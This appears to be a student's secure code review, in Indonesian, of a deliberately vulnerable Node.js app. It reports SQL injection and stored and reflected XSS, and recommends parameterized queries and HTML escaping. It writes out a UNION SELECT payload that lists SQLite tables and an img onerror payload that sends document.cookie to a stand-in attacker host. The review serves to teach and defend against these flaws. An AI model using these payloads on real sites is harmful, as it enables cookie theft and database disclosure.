# Secure Code Review - Yeremia Juan
Project: vulnerable.js
Tanggal: 2025-11-07

## Summary (1–2 kalimat)
Ditemukan 3 vulnerability HIGH RISK yang harus segera dipatch

## Findings (minimum 3)
1. **Issue:** SQL Injection  
   **Location:** /search handler (baris 77)  
   **Risk:** High — attacker bisa manipulasi query dan mengeksekusi query arbitrary. 
   Dengan memasukan ' UNION SELECT 1,sqlite_version(),name FROM sqlite_master WHERE type='table' -- ke dalam search, List kolom dan version sqlite berhasil didapatkan dari tabel
   Ini karena query tidak di parameterized sehingga memungkinkan injeksi SQL
   **Recommendation:** Untuk memperbaiki, gunakan prepared statement atau parameterized query
   contoh: const sql = `SELECT id, title, content FROM posts WHERE title LIKE ? OR content LIKE ?`;
   const params = [`%${q}%`, `%${q}%`];
   db.all(sql, params, (err, rows) => { ... });

2. **Issue:** Stored XSS  
   **Location:** /comments render (baris 125)  
   **Risk:** High — Input pengguna disimpan dalam database tanpa sanitasi dan kemudian ditampilkan langsung    dalam HTML. Ini memungkinkan penyerang untuk menyisipkan skrip berbahaya yang akan dieksekusi di browser pengguna lain yang melihat komentar tersebut. contoh payload: <script>alert('XSS')</script>, <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" onerror="this.src='https://attacker-server.com/steal?c='+document.cookie">
   **Recommendation:** Untuk memperbaiki, lakukan sanitasi pada input sebelum menyimpannya ke database atau lakukan encoding pada output. Contoh penggunaan fungsi escapeHtml: ${escapeHtml(r.body)}   

3. **Issue:** Reflected XSS
   **Location:** /reflect render (baris 163)  
   **Risk:** High — Input pengguna dari parameter query "msg" disisipkan langsung ke dalam respons HTML tanpa sanitasi. Mirip seperti stored XSS, ini memungkinkan penyerang untuk menyisipkan skrip berbahaya yang akan dieksekusi di browser pengguna yang mengunjungi URL tersebut.  contoh payload: <script>alert('XSS')</script>, <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" onerror="this.src='https://attacker-server.com/steal?c='+document.cookie">
   **Recommendation:**  Untuk memperbaiki, lakukan sanitasi pada input sebelum menyisipkannya ke dalam HTML atau lakukan encoding pada output. Contoh penggunaan fungsi escapeHtml: ${escapeHtml(msg)}, terutama pada bagian yang rentan seperti di bawah ini: <p>Server echoed (vulnerable): ${escapeHtml(msg)}</p> <!-- vulnerable: msg not escaped here

## Verification / How I tested
- Contoh request/URL yang saya pakai untuk reproduce (screen capture disertakan jika ada).

## Patch idea / Code snippet (singkat)
- Contoh prepared statement, contoh penggunaan `escapeHtml()` atau `textContent` replacement.

## Notes
- Prioritas: (High / Medium / Low)
- Keterangan tambahan / risiko bisnis
